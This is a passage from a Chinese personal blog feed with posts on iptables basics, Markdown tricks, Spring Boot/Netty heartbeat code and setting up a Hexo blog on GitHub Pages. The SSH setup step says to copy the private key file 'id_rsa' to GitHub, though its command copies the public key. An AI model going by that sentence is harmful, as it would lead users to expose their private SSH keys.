            "date_published": "2020-10-08T12:00:00.000Z",
            "content_html": "<h3 id=\"内容摘要\"><a class=\"markdownIt-Anchor\" href=\"#内容摘要\">#</a> 内容摘要</h3>\n<ul>\n<li>iptables 相关概念介绍</li>\n<li>iptables 相关命令</li>\n<li>常用命令解析</li>\n</ul>\n<a id=\"more\"></a>\n<h3 id=\"一-iptables相关概念介绍\"><a class=\"markdownIt-Anchor\" href=\"#一-iptables相关概念介绍\">#</a> 一、 iptables 相关概念介绍</h3>\n<ul>\n<li>\n<p>参考的博客链接 https://aimuke.github.io/linux/2019/05/28/iptables/</p>\n</li>\n<li>\n<p>功能简介</p>\n<p>根据管理员定义的规则 <code>rules</code>  对数据包进行过滤，在 <code>rules</code>  中可以指定数据包的 <code>源地址</code> 、 <code>目标地址</code> 、 <code>协议类型</code> 等，过滤操作包括 <code>ACCEPT</code> 、 <code>REJECT</code> 、 <code>DROP</code>  和 <code>LOG</code>  等等。</p>\n</li>\n<li>\n<p>Chain</p>\n<p>针对数据包的不同流向，又设置了不同的关卡，术语为 <code>Chain(链)</code> 。当数据包的目标主机为本机时使用 <code>INPUT</code> ，需要经过本机转发给其他服务器使用 <code>FORWORD</code> ，本机数据包发送出去使用 <code>OUTPUT</code> 。还有 <code>PREROUTING</code>  和 <code>POSTROUTING</code> ，下面这张图能够很好地说明几个链所处的位置，图片来源见水印</p>\n<p><img data-src=\"http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_2.png\" alt=\"a\"></p>\n</li>\n<li>\n<p>table</p>\n<p>不同的规则会对数据包进行不同的操作，相同功能的规则会构成一个 <code>table(表)</code> ， <code>iptables</code>  提供的表如下所示</p>\n<table>\n<thead>\n<tr>\n<th>表名</th>\n<th>功能</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>filter</td>\n<td>过滤，防火墙  内核模块： iptables_filter</td>\n</tr>\n<tr>\n<td>nat</td>\n<td>网络地址转换 内核模块： iptable_nat</td>\n</tr>\n<tr>\n<td>mangle</td>\n<td>拆解报文，做出修改，并重新封装 内核模块： iptable_mangle</td>\n</tr>\n<tr>\n<td>raw</td>\n<td>关闭 nat 表上启用的连接追踪功能 内核模块： iptable_raw</td>\n</tr>\n</tbody>\n</table>\n</li>\n<li>\n<p>Chain 和 table</p>\n<p>不同的链中包含不同的表，不同的表执行有优先级，具体可见下图（来源见水印）</p>\n<img data-src=\"http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_6.png\" alt=\"aa\" style=\"zoom:%;\" />\n</li>\n</ul>\n<h3 id=\"二-相关命令\"><a class=\"markdownIt-Anchor\" href=\"#二-相关命令\">#</a> 二、 相关命令</h3>\n<ul>\n<li>\n<p>基本命令</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo iptables -L</span><br></pre></td></tr></table></figure>\n<p>列出目前 <code>iptables</code>  中的规则，对于新建立的服务器，没有任何规则，结果如下</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Chain INPUT (policy ACCEPT)</span><br><span class=\"line\">target     prot opt <span class=\"built_in\">source</span>               destination</span><br><span class=\"line\"></span><br><span class=\"line\">Chain FORWARD (policy ACCEPT)</span><br><span class=\"line\">target     prot opt <span class=\"built_in\">source</span>               destination</span><br><span class=\"line\"></span><br><span class=\"line\">Chain OUTPUT (policy ACCEPT)</span><br><span class=\"line\">target     prot opt <span class=\"built_in\">source</span>               destination</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>命令参数</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. -A  添加规则到规则链</span><br><span class=\"line\">2. -L  列出当前的过滤规则</span><br><span class=\"line\">3. -m  conntrack 运行过滤规则根据连接状态进行匹配</span><br><span class=\"line\">4. -p  连接的目标协议</span><br><span class=\"line\">5. --dport  规则的目标端口</span><br><span class=\"line\">6. -j 跳转的特定的目标，iptables一般允许4个目标</span><br><span class=\"line\">    - ACCEPT 接收数据包并停止本链规则匹配</span><br><span class=\"line\">    - REJECT 拒绝数据包并提醒发送者，停止规则继续匹配</span><br><span class=\"line\">    - DROP 静默扔掉数据包，停止规则继续匹配</span><br><span class=\"line\">    - LOG 记录数据包，继续运行本链中更多的规则</span><br><span class=\"line\"></span><br><span class=\"line\">7. --log-prefix 记录时，将文本放在日志信息前</span><br><span class=\"line\">8. --log-level 日志使用的系统日志级别，默认为7</span><br><span class=\"line\">9. -i 仅匹配来自特定接口的数据包</span><br><span class=\"line\">10. -I 插入一条规则</span><br><span class=\"line\">    -I INPUT 5 插入INPUT链，使其成为第5条规则</span><br><span class=\"line\"></span><br><span class=\"line\">11. -v 在输出中显示更多信息</span><br><span class=\"line\">12. -s --source - address[&#x2F;mask] 指定源地址&#x2F;掩码</span><br><span class=\"line\">13. -d --destination - address[&#x2F;mask] 指定目的地</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h3 id=\"三-常用命令解析\"><a class=\"markdownIt-Anchor\" href=\"#三-常用命令解析\">#</a> 三、常用命令解析</h3>\n<ul>\n<li>\n<p>参考博客： <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC8zMzgyNzM1Mjg2ZTA=\">https://www.jianshu.com/p/3382735286e0</span> <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vZnJhbmtiL3AvNzQyNzk0NC5odG1s\">https://www.cnblogs.com/frankb/p/7427944.html</span></p>\n</li>\n<li>\n<p>样例 1</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">iptables -I INPUT -d xx.xx.xx.x -p tcp -m multiport --dports 22,80 -j ACCEPT</span><br></pre></td></tr></table></figure>\n<p>结果</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Chain INPUT (policy ACCEPT)</span><br><span class=\"line\">target     prot opt <span class=\"built_in\">source</span>               destination</span><br><span class=\"line\">ACCEPT     tcp  --  anywhere             xx.xx.xx.x.vultr.com  multiport dports ssh,http</span><br><span class=\"line\"></span><br><span class=\"line\">Chain FORWARD (policy ACCEPT)</span><br><span class=\"line\">target     prot opt <span class=\"built_in\">source</span>               destination</span><br><span class=\"line\"></span><br><span class=\"line\">Chain OUTPUT (policy ACCEPT)</span><br><span class=\"line\">target     prot opt <span class=\"built_in\">source</span>               destination</span><br></pre></td></tr></table></figure>\n<p>分析</p>\n<p>向 <code>INPUT</code>  链中添加了一条规则，接收目标地址为本机地址，端口为 22/80 的数据包，源地址没有指定</p>\n</li>\n<li>\n<p>持久化保存规则 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20va2Fpc2hpcmVuc2hpL3AvMTEyMjc2NjMuaHRtbA==\">https://www.cnblogs.com/kaishirenshi/p/11227663.html</span></p>\n</li>\n</ul>\n<blockquote>\n<p>  我们的问题不在于电视为我们展示具有娱乐性的内容，而在于所有的内容都以娱乐的方式表现出来，这就完全是另外一回事了。</p>\n<p align=\"right\">——《娱乐至死》\n</blockquote>\n",
            "tags": [
                "linux"
            ]
        },
        {
            "id": "https://snowroll.github.io/markdown-skills/",
            "url": "https://snowroll.github.io/markdown-skills/",
            "title": "markdown-skills",
            "date_published": "2020-09-30T02:29:04.000Z",
            "content_html": "<h3 id=\"内容摘要\"><a class=\"markdownIt-Anchor\" href=\"#内容摘要\">#</a> 内容摘要</h3>\n<ul>\n<li>绘制伪时间轴</li>\n<li>任务列表的正确使用姿势</li>\n</ul>\n<a id=\"more\"></a>\n<ul>\n<li>\n<p><strong>绘制时间轴</strong></p>\n<p>使用 Typora 中的 mermaid 的旅程图，官网链接 https://mermaid-js.github.io/mermaid/</p>\n<p>示例：</p>\n<p>使用 <code>~~~mermaid</code>  建立一个代码块</p>\n<p>简单 demo 如下：</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">journey</span><br><span class=\"line\">    title 简单时间轴</span><br><span class=\"line\">    section 一月</span><br><span class=\"line\">      test1: 2</span><br><span class=\"line\">    section 二月</span><br><span class=\"line\">    \ttest2: 5</span><br><span class=\"line\">    section 三月</span><br><span class=\"line\">    \ttest3: 0</span><br></pre></td></tr></table></figure>\n<p>实际效果：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">journey</span><br><span class=\"line\">    title 简单时间轴</span><br><span class=\"line\">    section 一月</span><br><span class=\"line\">      test1: 2</span><br><span class=\"line\">    section 二月</span><br><span class=\"line\">    \ttest2: 5</span><br><span class=\"line\">    section 三月</span><br><span class=\"line\">    \ttest3: 0</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>任务列表</p>\n<p>格式  <code>- [ ] </code> ，非常简单，之前用的时候有一个疑问， <code>-</code>  加空格会自动变为无序列表的点，后来发现只需要在 <code>[ ]</code>  之后再添加一个空格，就可以变为待选框了</p>\n<ul class=\"task-list\">\n<li class=\"task-list-item\">\n<p><input type=\"checkbox\" id=\"cbx_0\" disabled=\"true\"><label for=\"cbx_0\">  成功示例，不要忘记加空格</label></p>\n</li>\n<li>\n<p>[ ] 未加空格，失败案例</p>\n</li>\n</ul>\n</li>\n</ul>\n",
            "tags": [
                "markdown"
            ]
        },
        {
            "id": "https://snowroll.github.io/java-heartbeat/",
            "url": "https://snowroll.github.io/java-heartbeat/",
            "title": "Spring Boot中心跳机制的实现",
            "date_published": "2020-09-28T12:09:11.000Z",
            "content_html": "<h3 id=\"内容摘要\"><a class=\"markdownIt-Anchor\" href=\"#内容摘要\">#</a> 内容摘要</h3>\n<ul>\n<li>基于 netty 的心跳机制实现</li>\n<li>基于定时器的心跳机制 demo 实现</li>\n</ul>\n<a id=\"more\"></a>\n<h3 id=\"1-基于netty心跳机制的实现\"><a class=\"markdownIt-Anchor\" href=\"#1-基于netty心跳机制的实现\">#</a> 1. 基于 netty 心跳机制的实现</h3>\n<p>这部分的主要工作是参考 crossoverjie 的博客，博客地址为 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jcm9zc292ZXJqaWUudG9wLzIwMTgvMDUvMjQvbmV0dHkvTmV0dHkoMSlUQ1AtSGVhcnRiZWF0Lw==\">https://crossoverjie.top/2018/05/24/netty/Netty(1)TCP-Heartbeat/</span></p>\n<p>有兴趣的同学可以移步他的博客进行阅读，我在这里只总结一些我在复现过程中遇到的一些问题及解决方案</p>\n<ul>\n<li>\n<p>在 <code>EchoClienthandle</code>  函数中的 <code>SpringBeanFactory</code>  找不到相关包，下面的语句执行出错</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 第一行语句出错</span></span><br><span class=\"line\">CustomProtocol heartBeat = SpringBeanFactory.getBean(<span class=\"string\">&quot;heartBeat&quot;</span>, CustomProtocol.class);</span><br><span class=\"line\">ctx.writeAndFlush(heartBeat).addListener(ChannelFutureListener.CLOSE_ON_FAILURE) ;</span><br></pre></td></tr></table></figure>\n<p>解决：</p>\n<p>查找关于 <code>ChannelHandlerContext.writeAndFlush()</code>  定义，如下</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> ChannelFuture <span class=\"title\">writeAndFlush</span><span class=\"params\">(Object msg)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.writeAndFlush(msg, <span class=\"keyword\">this</span>.newPromise());</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>知 <code>heartBeat</code>  应为一个对象，所以考虑直接 <code>new</code> ，修改如下</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CustomProtocol customProtocol = <span class=\"keyword\">new</span> CustomProtocol(<span class=\"number\">1234L</span>, <span class=\"string\">&quot;test&quot;</span>);</span><br><span class=\"line\">ctx.writeAndFlush(customProtocol);</span><br></pre></td></tr></table></figure>\n<p>测试可以使用，具体内容可以自行修改</p>\n</li>\n<li>\n<p>关于编解码的使用</p>\n<p>crossoverjie 的博客提供自定义的编解码器，这个可以根据个人需求进行修改</p>\n<p>无论是客户端的 <code>EchoClientHandle</code>  还是服务器端的 <code>HeartBeatSimpleHandle</code>  都继承自 <code>SimpleChannelInboundHandler&lt;I&gt;</code>  抽象类，可以对不同的数据类型做处理，官方文档 https://netty.io/4.0/api/io/netty/channel/SimpleChannelInboundHandler.html</p>\n<p>对比博客中的定义及对应的编解码方法</p>\n<ul>\n<li>服务器端</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">HeartBeatSimpleHandle</span> <span class=\"keyword\">extends</span> <span class=\"title\">SimpleChannelInboundHandler</span>&lt;<span class=\"title\">CustomProtocol</span>&gt; </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//...  略去不重要的内容</span></span><br><span class=\"line\">    <span class=\"comment\">// 服务器端使用ByteBuf进行内容发送</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> ByteBuf HEART_BEAT =  Unpooled.unreleasableBuffer(Unpooled.copiedBuffer(<span class=\"keyword\">new</span> CustomProtocol(<span class=\"number\">123456L</span>,<span class=\"string\">&quot;pong&quot;</span>).toString(),CharsetUtil.UTF_8));  </span><br><span class=\"line\">    </span><br><span class=\"line\">  \t<span class=\"comment\">//...</span></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">userEventTriggered</span><span class=\"params\">(ChannelHandlerContext ctx, Object evt)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//...</span></span><br><span class=\"line\">        <span class=\"comment\">// 这里向客户端发送ByteBuf类型的数据，所以客户端必须解析ByteBuf</span></span><br><span class=\"line\">       \tctx.writeAndFlush(HEART_BEAT).addListener(ChannelFutureListener.CLOSE_ON_FAILURE) ;</span><br><span class=\"line\">  </span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"><span class=\"keyword\">super</span>.userEventTriggered(ctx, evt);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title\">channelRead0</span><span class=\"params\">(ChannelHandlerContext ctx, CustomProtocol customProtocol)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">      \t<span class=\"comment\">// 定义了处理CustomProtocol，复现channelRead0</span></span><br><span class=\"line\">        LOGGER.info(<span class=\"string\">&quot;收到customProtocol=&#123;&#125;&quot;</span>, customProtocol);</span><br><span class=\"line\">        <span class=\"comment\">// ... </span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 这段代码应该是在客户端，因为客户端收到的是ByteBuf的内容，所以需要解码为CustomProtocol</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">HeartbeatDecoder</span> <span class=\"keyword\">extends</span> <span class=\"title\">ByteToMessageDecoder</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title\">decode</span><span class=\"params\">(ChannelHandlerContext ctx, ByteBuf in, List&lt;Object&gt; out)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// ...</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>同理不再赘述客户端的内容</p>\n</li>\n<li>\n<p>netty 心跳机制的问题</p>\n<p>netty 底层相当于是基于 socket 连接实现的，所以需要服务器和客户端进行长连接，耦合严重。倘若，甲方不想心跳机制两端的机器保持 socket 的连接，只是简单的定时传送数据该如何实现？这就要用到我接下来提到的方法</p>\n</li>\n</ul>\n<h3 id=\"2-基于定时器的心跳机制demo实现\"><a class=\"markdownIt-Anchor\" href=\"#2-基于定时器的心跳机制demo实现\">#</a> 2.  基于定时器的心跳机制 demo 实现</h3>\n<ul>\n<li>\n<p>代码逻辑</p>\n<p>A 定时请求数据  ==&gt; 发送请求给 B 的接口 ==&gt; B 的接口接收信息，返回对应的信息 ==&gt; A 处理返回的信息</p>\n<p>这个过程不需要 A、B 两者用 socket 连接，实现了解耦</p>\n</li>\n<li>\n<p>定时</p>\n<p>参考博客： <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTA5NjM5NDgvYXJ0aWNsZS9kZXRhaWxzLzUyOTQ2MjY4\">https://blog.csdn.net/u010963948/article/details/52946268</span></p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">HeartBeat</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * description: 定时器的回调函数</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    Runnable runnable = <span class=\"keyword\">new</span> Runnable() &#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">          System.out.println(<span class=\"string\">&quot;hello world!&quot;</span>);  <span class=\"comment\">// 自定义你需要的操作</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     *</span></span><br><span class=\"line\"><span class=\"comment\">     * description: 定时发送心跳， scheduleAtFixedRate param1： 回调函数 param1： 首次执行滞后时间 param1： 间隔时间 param1： 单位时间</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@throws</span> InterruptedException</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"meta\">@PostConstruct</span>  <span class=\"comment\">// 依赖注入完成之后，方法就要被执行</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">start</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> InterruptedException </span>&#123;</span><br><span class=\"line\">        ScheduledExecutorService service = Executors.newSingleThreadScheduledExecutor();</span><br><span class=\"line\">        service.scheduleAtFixedRate(runnable, <span class=\"number\">1</span>, <span class=\"number\">10</span>, TimeUnit.SECONDS);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>PostConstruct</code>  这个注释非常重要，注释对应的方法会在程序的依赖加载完成之后执行，这样就可以不用直接写在 <code>main</code>  函数中</p>\n<p>回调函数中的可能需要对 JSON 数据进行分析，可以直接使用 Gson 处理，参考博客 https://blog.csdn.net/xingfei_work/article/details/76572550</p>\n</li>\n</ul>\n<center>侠客行\n</center>\n<center>唐·李白\n<center>赵客缦胡缨，吴钩霜雪明。\n银鞍照白马，飒沓如流星。\n<center>十步杀一人，千里不留行。\n事了拂衣去，深藏身与名。\n<center>闲过信陵饮，脱剑膝前横。将炙啖朱亥，持觞劝侯嬴。\n<center>三杯吐然诺，五岳倒为轻。\n眼花耳热后，意气素霓生。\n<center>救赵挥金槌，邯郸先震惊。\n千秋二壮士，烜赫大梁城。\n<center>纵死侠骨香，不惭世上英。\n谁能书阁下，白首太玄经。\n",
            "tags": [
                "heartbeat, java"
            ]
        },
        {
            "id": "https://snowroll.github.io/git-githubpage/",
            "url": "https://snowroll.github.io/git-githubpage/",
            "title": "GitHub Page 个人博客配置记录",
            "date_published": "2020-09-24T09:06:25.000Z",
            "content_html": "<h3 id=\"内容目录\"><a class=\"markdownIt-Anchor\" href=\"#内容目录\">#</a> 内容目录</h3>\n<ul>\n<li>使用 hexo 搭建自己的 Github Page 博客</li>\n<li>设置自定义域名，并添加 https 保护</li>\n<li>国内外分流访问</li>\n</ul>\n<a id=\"more\"></a>\n<h3 id=\"1-使用hexo搭建github-page-博客\"><a class=\"markdownIt-Anchor\" href=\"#1-使用hexo搭建github-page-博客\">#</a> 1. 使用 hexo 搭建 Github Page 博客</h3>\n<p>这部分工作主要参考的是 zjufangzh 的博客，链接地址为 https://blog.csdn.net/sinat_37781304/article/details/82729029</p>\n<ul>\n<li>\n<p>首先下载 hexo</p>\n<p>hexo 官方网站 https://hexo.io/zh-cn/</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install hexo-cli -g</span><br><span class=\"line\"><span class=\"comment\"># Linux npm 安装（如果没有）</span></span><br><span class=\"line\">sudo apt-get install nodejs</span><br><span class=\"line\">sudo apt-get install npm</span><br></pre></td></tr></table></figure>\n<p>在合适的目录开始创建自己的博客</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hexo init blog  <span class=\"comment\"># 初始化名字为blog的博客</span></span><br><span class=\"line\"><span class=\"built_in\">cd</span> blog</span><br><span class=\"line\">npm install  </span><br></pre></td></tr></table></figure>\n<p>下载完成之后的目录</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">node_modules&#x2F;  依赖包</span><br><span class=\"line\">scaffolds&#x2F;  生成文章的模板</span><br><span class=\"line\">source&#x2F;  博客内容，主要为md文件</span><br><span class=\"line\">themes&#x2F;  博客主题</span><br><span class=\"line\">public&#x2F;  博客的发布页面</span><br><span class=\"line\">_config.yml  博客网站的配置文件</span><br></pre></td></tr></table></figure>\n<p>运行</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hexo clean  <span class=\"comment\"># 清理之前的发布内容</span></span><br><span class=\"line\">hexo generate  <span class=\"comment\"># 生成新的发布页面，命令可简写为hexo g</span></span><br><span class=\"line\">hexo server  <span class=\"comment\"># 部署到本地localhost:4000，命令可简写为hexo s </span></span><br></pre></td></tr></table></figure>\n<p>浏览器打开 http://localhost:4000 即可看到效果</p>\n</li>\n<li>\n<p>博客部署到 Github Page 上</p>\n<p>登录 github，创建一个新的 repository，名字为  <code>username.github.io</code> ，例如我的 github 账户名为 snowroll，所以 repository 的名字为 <code>snowroll.github.io</code></p>\n<img data-src=\"/git-githubpage/repository_name.jpg\" class=\"\">\n<p>生成 ssh，添加到 github 中</p>\n<p>打开 git bash（如没有，请自行查询下载）</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git config --global user.name <span class=\"string\">&quot;yourname&quot;</span>  <span class=\"comment\"># yourname为你的github用户名</span></span><br><span class=\"line\">git config --global user.email <span class=\"string\">&quot;youremail&quot;</span>  <span class=\"comment\"># youremail为你的github对应的邮箱</span></span><br><span class=\"line\">ssh-keygen -t rsa -C <span class=\"string\">&quot;youremail&quot;</span>  <span class=\"comment\"># -t 指定密钥类型，-C 公钥备注，一般写自己的邮箱 生成ssh，一路回车即可</span></span><br></pre></td></tr></table></figure>\n<p>找到生成的 <code>.ssh</code>  文件夹，打开</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id_rsa  # 私钥</span><br><span class=\"line\">id_rsa.pub  # 公钥</span><br><span class=\"line\">known_hosts  # 记录服务器端的Host，IP及rsa文件，作缓存用</span><br></pre></td></tr></table></figure>\n<p>复制 <code>id_rsa</code>  内的内容到剪切板，直接打开复制也可以</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pbcopy &lt; ./id_rsa.pub  <span class=\"comment\"># mac 系统下的命令行操作</span></span><br></pre></td></tr></table></figure>\n<p>打开 github 的个人设置中的 SSH and GPG keys，点击 New SSH key，将复制的内容粘贴进去即可</p>\n<p>测试是否成功</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh -T git@github.com</span><br></pre></td></tr></table></figure>\n<p>出现 You’ve successfully authenticated, but GitHub does not provide shell access. 提示即意味成功</p>\n<p>生成 ssh key 的参考博客，<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2NzYxODMxL2FydGljbGUvZGV0YWlscy84ODcyNTY3MA==\">https://blog.csdn.net/qq_36761831/article/details/88725670</span></p>\n<p>将 hexo 与 GitHub 关联，修改 <code>blog/</code>  下的 <code>_config.yml</code></p>\n<figure 